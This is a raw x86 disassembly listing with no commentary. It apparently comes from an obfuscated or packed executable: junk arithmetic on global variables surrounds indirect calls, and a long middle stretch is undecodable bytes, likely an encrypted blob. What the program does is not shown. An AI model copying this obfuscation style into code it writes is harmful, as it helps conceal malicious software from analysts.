  402b0f:	cmp    DWORD PTR ds:0x428371,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x4281b1
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x428258
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428395
  402b40:	sub    DWORD PTR ds:0x42837d,edx
  402b46:	sbb    DWORD PTR ds:0x428469,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x42834d
  402b53:	adc    DWORD PTR ds:0x42848d,edx
  402b59:	add    DWORD PTR ds:0x42858d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42859d
  402b67:	xor    edx,DWORD PTR ds:0x428505
  402b6d:	mov    DWORD PTR ds:0x42859d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42847d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x42834d,0x0
  402b9a:	mov    DWORD PTR ds:0x4284f1,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x428359
  402baa:	mov    DWORD PTR ds:0x428365,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x428369,0x124b
  402bbf:	mov    DWORD PTR ds:0x428441,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x42834d,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x42850d,edx
  402be7:	and    edx,DWORD PTR ds:0x428445
  402bed:	mov    edx,DWORD PTR ds:0x428595
  402bf3:	xor    DWORD PTR ds:0x4284e5,edx
  402bf9:	mov    edx,DWORD PTR ds:0x4285d9
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x428449,edx
  402c07:	and    DWORD PTR ds:0x42836d,0x245f
  402c11:	cmp    DWORD PTR ds:0x428361,0x0
  402c18:	mov    DWORD PTR ds:0x428501,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x4284a1,edx
  402c34:	cmp    DWORD PTR ds:0x428361,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x428361,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x428369,0x428521
  402c69:	sbb    DWORD PTR ds:0x428505,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x4284cd
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x428425,edx
  402c81:	xor    DWORD PTR ds:0x428475,0x428441
  402c8b:	sbb    DWORD PTR ds:0x428491,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x428465,0x0
  402c9f:	mov    DWORD PTR ds:0x428581,0x384
  402ca9:	mov    DWORD PTR ds:0x428365,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x428569
  402cb9:	mov    DWORD PTR ds:0x428521,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x42850d,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x428465,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x428521,0x612a
  402d00:	sbb    DWORD PTR ds:0x428585,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428585
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x428425
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x428521,0x0
  402d37:	mov    DWORD PTR ds:0x428489,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x42844d
  402d47:	mov    edx,DWORD PTR ds:0x42851d
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428471,0x114
  402d5c:	cmp    DWORD PTR ds:0x428521,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428579
  402d79:	or     DWORD PTR ds:0x428459,ebx
  402d7f:	sub    DWORD PTR ds:0x42851d,ecx
  402d85:	mov    edx,DWORD PTR ds:0x42856d
  402d8b:	xor    DWORD PTR ds:0x42850d,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x42835d
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x428459,0x428439
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x428521
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x4284a1
  402dc2:	xor    DWORD PTR ds:0x42850d,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428491,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x428431,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x42854d
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x4285d9
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428591,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x42842d,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42859d,0x0
  402e23:	mov    DWORD PTR ds:0x42848d,ebx
  402e29:	mov    DWORD PTR ds:0x428491,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x428439
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x42845d,0x5c7
  402e49:	mov    DWORD PTR ds:0x42849d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42859d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428371,0x7db0
  402e73:	sub    DWORD PTR ds:0x4285a1,ecx
  402e79:	adc    DWORD PTR ds:0x42842d,edx
  402e7f:	and    edx,DWORD PTR ds:0x428509
  402e85:	mov    edx,DWORD PTR ds:0x4283bd
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42838d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428471
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x428509,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	push   0x62
  402ebb:	hlt    
  402ebc:	iret   
  402ebd:	mov    ebp,0xbdbebee0
  402ec2:	les    edi,FWORD PTR [esi-0x70995942]
  402ec8:	ret    
  402ec9:	adc    ebp,esp
  402ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ecc:	fld    TBYTE PTR [esi-0x39]
  402ecf:	dec    ebp
  402ed0:	cmp    DWORD PTR [edx-0x6e4dd047],ebx
  402ed6:	pushf  
  402ed7:	int    0xfb
  402ed9:	fcomp  QWORD PTR [edx+0x642e84ff]
  402edf:	jb     0x402e98
  402ee1:	lock ja 0x402e97
  402ee4:	jns    0x402e90
  402ee6:	or     al,0x24
  402ee8:	and    edx,DWORD PTR [esi+0x6f3368d3]
  402eee:	jb     0x402f4c
  402ef0:	adc    DWORD PTR [edx-0x7fe226f0],0xffffffd1
  402ef7:	popa   
  402ef8:	aam    0x55
  402efa:	das    
  402efb:	aas    
  402efc:	jne    0x402f6b
  402efe:	mov    al,0x8e
  402f00:	ficomp WORD PTR [eax-0x13fd6153]
  402f06:	imul   ecx,esp,0xfffffff7
  402f09:	push   edi
  402f0a:	add    ah,dh
  402f0c:	adc    BYTE PTR [ebx-0x445503ba],bh
  402f12:	adc    eax,esi
  402f14:	lods   eax,DWORD PTR ds:[esi]
  402f15:	sub    eax,0xeedf66fe
  402f1a:	lds    eax,FWORD PTR [ebx+0x22]
  402f1d:	push   ebp
  402f1e:	pop    ebp
  402f1f:	mov    al,0xe5
  402f21:	stos   DWORD PTR es:[edi],eax
  402f22:	adc    eax,0x21462aa8
  402f27:	xor    bl,BYTE PTR [ebx+0x0]
  402f2a:	ret    0x9eb8
  402f2d:	arpl   WORD PTR [edx-0x477b1fee],bx
  402f33:	scas   al,BYTE PTR es:[edi]
  402f34:	mov    ecx,0x437c26e9
  402f39:	daa    
  402f3a:	test   al,0x3f
  402f3c:	je     0x402f40
  402f3e:	or     edi,ecx
  402f40:	shr    BYTE PTR [edi+0x13],cl
  402f43:	dec    edi
  402f44:	mov    ebp,DWORD PTR [ebx+0x4f]
  402f47:	(bad)
  402f4b:	dec    eax
  402f4c:	mov    cl,0x80
  402f4e:	inc    ebp
  402f4f:	or     DWORD PTR [eax-0x51],ebp
  402f52:	aad    0x6e
  402f54:	scas   al,BYTE PTR es:[edi]
  402f55:	pushf  
  402f56:	push   edx
  402f57:	push   ecx
  402f58:	(bad)  
  402f59:	sahf   
  402f5a:	dec    ebp
  402f5b:	xor    eax,0xddd32f2
  402f60:	fst    DWORD PTR [esi+0x65]
  402f63:	and    edx,DWORD PTR [ecx+0x5164436c]
  402f69:	lods   al,BYTE PTR ds:[esi]
  402f6a:	dec    ecx
  402f6b:	sub    al,0x63
  402f6d:	(bad)  
  402f6e:	iret   
  402f6f:	mov    ebp,0xc12e919b
  402f74:	push   edi
  402f75:	mov    ecx,0x3d924911
  402f7a:	mov    bl,0x31
  402f7c:	jg     0x402f9a
  402f7e:	jnp    0x402ff1
  402f80:	push   0x2fd324cb
  402f85:	mov    bl,0xe2
  402f87:	shl    DWORD PTR [eax],0x34
  402f8a:	pop    edx
  402f8b:	or     al,0xda
  402f8d:	add    DWORD PTR [eax],eax
  402f8f:	mov    ebp,0xa85d1ae5
  402f94:	cmp    al,0x5a
  402f96:	and    ebx,ebx
  402f98:	aaa    
  402f99:	push   ebx
  402f9a:	jae    0x402fa3
  402f9c:	rcl    BYTE PTR [ebp-0x6f1f7b1a],0x84
  402fa3:	aad    0x91
  402fa5:	enter  0x7fa6,0xe0
  402fa9:	mov    esi,0xee19aad
  402fae:	push   ss
  402faf:	mov    ds:0x4487e273,al
  402fb4:	(bad)  
  402fb6:	cdq    
  402fb7:	jg     0x402faa
  402fb9:	or     BYTE PTR [edx],0xf9
  402fbc:	sub    DWORD PTR [esi+0x9],esp
  402fbf:	dec    ebp
  402fc0:	xor    al,ah
  402fc2:	test   eax,0xe4b554ce
  402fc7:	jg     0x402fbe
  402fc9:	xchg   ebp,eax
  402fca:	in     eax,dx
  402fcb:	(bad)  [esi+ebx*1]
  402fce:	xor    eax,0x831149d3
  402fd3:	add    al,ch
  402fd5:	add    BYTE PTR [edx],ch
  402fd7:	jbe    0x402f9f
  402fd9:	inc    edi
  402fda:	ds daa 
  402fdc:	push   ss
  402fdd:	and    DWORD PTR [edx+0x77],0xda54b862
  402fe4:	and    dl,BYTE PTR [eax]
  402fe6:	out    dx,eax
  402fe7:	shl    cl,0x3c
  402fea:	imul   ecx,DWORD PTR [esi],0xffffff8e
  402fed:	and    ebx,DWORD PTR [ebp+0x5d]
  402ff0:	add    eax,DWORD PTR [ecx+0x65]
  402ff3:	leave  
  402ff4:	push   edx
  402ff5:	retf   
  402ff6:	es test al,0x62
  402ff9:	dec    edi
  402ffa:	push   esp
  402ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffc:	fldenv [eax]
  402ffe:	ja     0x40302f
  403000:	lahf   
  403001:	fistp  WORD PTR [esi+eax*4-0x4]
  403005:	adc    al,0xad
  403007:	fcomp  QWORD PTR [ebx+0x1b839de1]
  40300d:	out    0xa3,eax
  40300f:	out    dx,eax
  403010:	hlt    
  403011:	hlt    
  403012:	jmp    0x403085
  403014:	pop    ebp
  403015:	or     esi,DWORD PTR [esi]
  403017:	sub    bh,BYTE PTR [edx]
  403019:	fs daa 
  40301b:	add    BYTE PTR [esi+0x55360893],al
  403021:	out    0xc4,eax
  403023:	(bad)  
  403024:	hlt    
  403025:	jl     0x40304f
  403027:	fcmove st,st(6)
  403029:	rcr    ch,cl
  40302b:	xor    eax,0xdfd8bbff
  403030:	pop    esi
  403031:	pop    ss
  403032:	fcom   QWORD PTR [edx+0x6a817140]
  403038:	dec    ebx
  403039:	sub    BYTE PTR [eax-0x24386cbb],al
  40303f:	rol    BYTE PTR [edx-0x19],cl
  403042:	int    0x6a
  403044:	in     eax,0xf
  403046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403047:	mov    ecx,0xe095abf2
  40304c:	repz dec ebx
  40304e:	xchg   ebx,eax
  40304f:	fidivr WORD PTR es:[esi]
  403052:	enter  0x7c15,0x1a
  403056:	and    edx,DWORD PTR [edi+0x1f]
  403059:	rcl    DWORD PTR [ecx-0x10],cl
  40305c:	sbb    ebx,DWORD PTR [eax]
  40305e:	test   eax,0x7d545f84
  403063:	cmp    ecx,DWORD PTR [esi+0x7215b2cd]
  403069:	and    al,BYTE PTR [edx-0x60]
  40306c:	test   BYTE PTR [edx+esi*4-0x4ae47a76],dl
  403073:	mov    dl,0x33
  403075:	mov    al,ds:0x321bcdc7
  40307a:	cwde   
  40307b:	mov    DWORD PTR [ecx+0x30],edi
  40307e:	jnp    0x40300a
  403080:	ret    0xe818
  403083:	xor    al,0xc2
  403085:	das    
  403086:	cdq    
  403087:	jmp    0x403101
  403089:	push   ebx
  40308a:	pop    ebx
  40308b:	lea    esi,[ebx-0x3c]
  40308e:	imul   esi,eax,0x266105d3
  403094:	ds ins DWORD PTR es:[edi],dx
  403096:	std    
  403097:	adc    BYTE PTR [ecx+edx*1+0x5d],ah
  40309b:	hlt    
  40309c:	jp     0x4030f6
  40309e:	mov    dl,0x87
  4030a0:	xchg   esi,eax
  4030a1:	fs (bad) 
  4030a3:	mov    ch,0xe
  4030a5:	(bad)  
  4030a6:	(bad)  
  4030a7:	sub    eax,0x8bf74824
  4030ac:	xor    cl,cl
  4030ae:	xchg   esp,eax
  4030af:	mov    eax,ds:0x367dca55
  4030b4:	popa   
  4030b5:	jbe    0x4030cc
  4030b7:	pop    eax
  4030b8:	mov    BYTE PTR [esi+0x2a],cl
  4030bb:	inc    esi
  4030bc:	cmp    DWORD PTR [ecx+0x6],0xb98523ac
  4030c3:	dec    edi
  4030c4:	out    0xf6,al
  4030c6:	push   esp
  4030c7:	jp     0x403138
  4030c9:	stos   BYTE PTR es:[edi],al
  4030ca:	fist   WORD PTR [esi]
  4030cc:	stos   DWORD PTR es:[edi],eax
  4030cd:	js     0x40312f
  4030cf:	pop    ss
  4030d0:	imul   ecx,ebx,0x4f
  4030d3:	adc    BYTE PTR ss:[ebx],al
  4030d6:	loopne 0x403078
  4030d8:	xor    DWORD PTR [esi-0x6],ebx
  4030db:	inc    ebp
  4030dc:	ret    0xa013
  4030df:	mov    cl,0xc2
  4030e1:	xor    eax,esi
  4030e3:	in     al,dx
  4030e4:	call   0x1b45:0x6da257ba
  4030eb:	fs inc edx
  4030ed:	jo     0x4030f8
  4030ef:	in     eax,0x31
  4030f1:	sti    
  4030f2:	loopne 0x403100
  4030f4:	lds    ebx,FWORD PTR [ebp+0x5e6f3bf0]
  4030fa:	stos   DWORD PTR es:[edi],eax
  4030fb:	mov    cl,0x34
  4030fd:	scas   eax,DWORD PTR es:[edi]
  4030fe:	js     0x403155
  403100:	lea    ebp,[ecx]
  403102:	xlat   BYTE PTR ds:[ebx]
  403103:	pop    esi
  403104:	xchg   esi,eax
  403105:	mov    dh,0x79
  403107:	xor    eax,0xd6c6a0d
  40310c:	lahf   
  40310d:	mov    dh,0xd7
  40310f:	adc    ecx,edi
  403111:	sub    BYTE PTR [ebx],ah
  403113:	add    bl,BYTE PTR [edx]
  403115:	sar    DWORD PTR [edi],0xa5
  403118:	out    dx,al
  403119:	shl    BYTE PTR [esi-0x1f],1
  40311c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40311d:	adc    esi,edx
  40311f:	or     edi,DWORD PTR [edx]
  403121:	arpl   WORD PTR [edx+0x55],di
  403124:	and    DWORD PTR [ebx+0x60aa1c57],esi
  40312a:	mov    ss,WORD PTR [ecx+0x2a]
  40312d:	or     edi,DWORD PTR [edi+esi*2+0x2e]
  403131:	sbb    esi,ecx
  403133:	cmp    al,0x3a
  403135:	fadd   st,st(6)
  403137:	fisub  DWORD PTR [edi]
  403139:	retf   
  40313a:	imul   edx,DWORD PTR [ebx],0xffffffa8
  40313d:	out    0xf7,eax
  40313f:	cmc    
  403140:	inc    esi
  403141:	inc    eax
  403142:	imul   esp,DWORD PTR [eax],0x830699ac
  403148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403149:	xchg   edx,eax
  40314a:	daa    
  40314b:	mov    BYTE PTR [eax+0x1c],ch
  40314e:	xchg   esi,eax
  40314f:	inc    edi
  403150:	pop    esi
  403151:	(bad)  
  403152:	mov    ah,0x38
  403154:	cwde   
  403155:	jmp    0x55e4efe3
  40315a:	adc    bh,dh
  40315c:	call   0xc70d:0xa878ac5f
  403163:	add    eax,0xb4cc1667
  403168:	fcmovu st,st(4)
  40316a:	jne    0x40317b
  40316c:	jmp    0x4031b7
  40316e:	stos   DWORD PTR es:[edi],eax
  40316f:	mov    al,ds:0x78138942
  403174:	test   BYTE PTR [ebx],0xae
  403177:	popf   
  403178:	ds pop ecx
  40317a:	neg    ch
  40317c:	sahf   
  40317d:	int3   
  40317e:	inc    esi
  40317f:	pop    ss
  403180:	loope  0x4031f4
  403182:	mov    al,ds:0xb3c41e1d
  403187:	in     eax,0xf9
  403189:	jmp    0x4031f0
  40318b:	inc    ebx
  40318c:	jo     0x403127
  40318e:	xchg   esp,eax
  40318f:	mov    edx,0x82b1e79c
  403194:	or     eax,0xa2d7ac28
  403199:	dec    ebp
  40319a:	sub    bl,BYTE PTR [edx]
  40319c:	(bad)  
  40319d:	in     eax,0xc3
  40319f:	pushf  
  4031a0:	add    eax,0x156bcd82
  4031a5:	mov    eax,0xa7e0a29a
  4031aa:	push   ds
  4031ab:	test   eax,0x56c37385
  4031b0:	adc    ebx,DWORD PTR [eax-0x39]
  4031b3:	inc    esp
  4031b4:	(bad)  
  4031b5:	out    dx,al
  4031b6:	push   ecx
  4031b7:	cwde   
  4031b8:	ins    BYTE PTR es:[edi],dx
  4031b9:	and    DWORD PTR [ebx],0x4d
  4031bc:	mov    dh,0x9e
  4031be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031bf:	repz push es
  4031c1:	add    dh,BYTE PTR ds:0x45990789
  4031c7:	(bad)  
  4031c8:	adc    cl,BYTE PTR [edi+0xdb4fc9b]
  4031ce:	(bad)  
  4031cf:	loope  0x4031f9
  4031d1:	pop    eax
  4031d2:	mov    al,0x52
  4031d4:	jb     0x403211
  4031d6:	inc    ebx
  4031d7:	fs (bad) 
  4031d9:	sahf   
  4031da:	js     0x403192
  4031dc:	xchg   ebx,eax
  4031dd:	in     eax,0x35
  4031df:	ja     0x40319c
  4031e1:	xor    DWORD PTR [esi],edx
  4031e3:	xchg   edi,eax
  4031e4:	lds    eax,FWORD PTR [esi]
  4031e6:	leave  
  4031e7:	pop    es
  4031e8:	int3   
  4031e9:	lock (bad) [eax+0x31]
  4031ed:	into   
  4031ee:	mov    ds:0xffa87805,eax
  4031f3:	lock mov edx,0xd9eb0b7
  4031f9:	dec    esi
  4031fa:	mov    bh,0xd4
  4031fc:	mov    cl,0x1
  4031fe:	adc    al,0x86
  403200:	jo     0x40320e
  403202:	jg     0x403266
  403204:	ror    DWORD PTR [ebx],0x50
  403207:	mov    ecx,0x9da320e
  40320c:	div    BYTE PTR [esp+esi*8-0x2c40183b]
  403213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403214:	out    dx,eax
  403215:	dec    eax
  403216:	or     esi,edi
  403218:	outs   dx,BYTE PTR ds:[esi]
  403219:	rol    ecx,0x32
  40321c:	fld    DWORD PTR [esi-0x60ca50a0]
  403222:	int3   
  403223:	div    DWORD PTR [ebp+0x33]
  403226:	jmp    0x403224
  403228:	push   es
  403229:	fcomp  st(3)
  40322b:	xchg   esp,eax
  40322c:	mov    edi,0x4ae571bd
  403231:	fidiv  DWORD PTR [ecx]
  403233:	push   ds
  403234:	fbld   TBYTE PTR [esi]
  403236:	cmp    bl,BYTE PTR [esi+0x66af4221]
  40323c:	mov    esp,ecx
  40323e:	xor    edx,DWORD PTR [ecx-0x7]
  403241:	dec    esi
  403242:	sub    al,0xe3
  403244:	in     eax,dx
  403245:	inc    edi
  403246:	mov    edx,0x538b7a08
  40324b:	add    al,0x31
  40324d:	jge    0x403233
  40324f:	sub    DWORD PTR ds:0x4284f9,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428599,0x42837d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428479
  40326f:	xor    DWORD PTR ds:0x42842d,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x428519,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x4284e9,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428575,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42857d,0x0
  4032b7:	mov    DWORD PTR ds:0x428511,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x428425
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42837d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42857d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x42843d
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x4284f5,0x290
  403302:	sbb    DWORD PTR ds:0x428431,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x428511,0x0
  403312:	mov    edx,DWORD PTR ds:0x428451
  403318:	mov    DWORD PTR ds:0x4284ed,0x501f
  403322:	mov    edx,DWORD PTR ds:0x4284f1
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428395,0x1634
  403337:	mov    DWORD PTR ds:0x428509,0xaef
  403341:	cmp    DWORD PTR ds:0x428511,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x428451,0x42849d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x428431
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x428509
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428385,0x4284f9
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x428355,0x428475
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x42846d,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x42835d,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x428429,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428589,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428381
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428591,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x428459,0x428451
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428385,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x428435,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x42851d,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x4284f1,0x0
  403427:	mov    DWORD PTR ds:0x428581,0xe2a
  403431:	mov    DWORD PTR ds:0x428369,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428595,0xfd5
  40344b:	mov    DWORD PTR ds:0x428469,ecx
  403451:	cmp    DWORD PTR ds:0x4284f1,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428287
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x42844d
  403489:	sub    edx,DWORD PTR ds:0x428505
  40348f:	mov    DWORD PTR ds:0x42844d,edx
  403495:	mov    DWORD PTR ds:0x428381,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42838d
  4034a5:	mov    edx,DWORD PTR ds:0x42859d
  4034ab:	and    DWORD PTR ds:0x428455,edx
  4034b1:	inc    DWORD PTR ds:0x42834d
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x428365,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x428569,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x428449,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x428501,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x4284a1,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428489,0x42850d
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x428369,0x428381
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x428361,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x428511,0x428491
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x42846d,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fst    QWORD PTR [eax+edi*8]
  403557:	stos   BYTE PTR es:[edi],al
  403558:	jecxz  0x403518
  40355a:	call   0xc4fdf41d
  40355f:	mov    esi,0x7690bebe
  403564:	xchg   edx,eax
